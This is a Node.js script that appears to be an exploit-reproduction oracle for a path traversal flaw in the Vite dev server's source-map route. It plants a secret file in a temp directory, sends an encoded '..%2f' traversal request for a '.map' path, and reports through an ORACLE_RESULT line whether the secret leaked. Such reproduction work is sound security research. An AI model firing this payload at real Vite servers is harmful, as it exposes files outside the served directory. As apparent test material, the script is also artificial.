const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';
  let server;

  const marker = 'vite-map-pt-' + Date.now() + '-' + Math.random().toString(16).slice(2);
  const base = path.join(os.tmpdir(), marker);
  const root = path.join(base, 'root');

  function callMiddleware(url) {
    return new Promise((resolve, reject) => {
      const req = { method: 'GET', url, headers: { accept: '*/*' } };
      const chunks = [];
      let done = false;

      const res = {
        statusCode: 200,
        headers: {},
        setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
        getHeader(k) { return this.headers[String(k).toLowerCase()]; },
        writeHead(code, headers) {
          this.statusCode = code;
          if (headers && typeof headers === 'object') {
            for (const k of Object.keys(headers)) this.setHeader(k, headers[k]);
          }
        },
        write(data) {
          if (data != null) chunks.push(Buffer.from(String(data)));
          return true;
        },
        end(data) {
          if (data != null) chunks.push(Buffer.from(String(data)));
          if (!done) {
            done = true;
            resolve({
              statusCode: this.statusCode || 200,
              body: Buffer.concat(chunks).toString('utf8'),
              viaNext: false
            });
          }
        }
      };

      try {
        server.middlewares(req, res, (err) => {
          if (done) return;
          if (err) {
            done = true;
            reject(err);
            return;
          }
          done = true;
          resolve({
            statusCode: res.statusCode || 404,
            body: Buffer.concat(chunks).toString('utf8'),
            viaNext: true
          });
        });
      } catch (e) {
        if (!done) {
          done = true;
          reject(e);
        }
      }
    });
  }

  try {
    fs.mkdirSync(path.join(root, 'node_modules', '.vite', 'deps'), { recursive: true });

    const benignMapPath = path.join(root, 'node_modules', '.vite', 'deps', 'safe.js.map');
    const benignObj = { version: 3, file: 'safe.js', sources: ['safe.ts'], names: [], mappings: '' };
    fs.writeFileSync(benignMapPath, JSON.stringify(benignObj), 'utf8');

    const outside = path.join(base, 'outside-secret.txt');
    const secret = 'TOP_SECRET_' + marker;
    fs.writeFileSync(outside, secret, 'utf8');

    const vite = require('vite');
    if (!vite || typeof vite.createServer !== 'function') throw new Error('vite.createServer unavailable');

    server = await vite.createServer({
      root,
      logLevel: 'silent',
      appType: 'custom',
      server: { middlewareMode: true }
    });

    const benign = await callMiddleware('/node_modules/.vite/deps/safe.js.map');
    const benignOk = benign.statusCode < 400 && benign.body.includes('"version":3');
    if (!benignOk) {
      throw new Error('benign_failed status=' + benign.statusCode + ' viaNext=' + benign.viaNext + ' len=' + benign.body.length);
    }

    operation_completed = true;

    const malPath = '/node_modules/.vite/deps/..%2f..%2f..%2foutside-secret.txt.map';
    try {
      const mal = await callMiddleware(malPath);
      const leaked = mal.body.includes(secret);
      exploit_succeeded = leaked;
      evidence = 'marker=' + marker + ';benign_status=' + benign.statusCode + ';mal_status=' + mal.statusCode + ';mal_viaNext=' + mal.viaNext + ';mal_len=' + mal.body.length + ';leaked=' + leaked;
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'marker=' + marker + ';malicious_exception=' + (e && e.message ? e.message : String(e));
    }
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception=' + (e && e.message ? e.message : String(e));
  } finally {
    if (server && typeof server.close === 'function') {
      try { await server.close(); } catch (_) {}
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();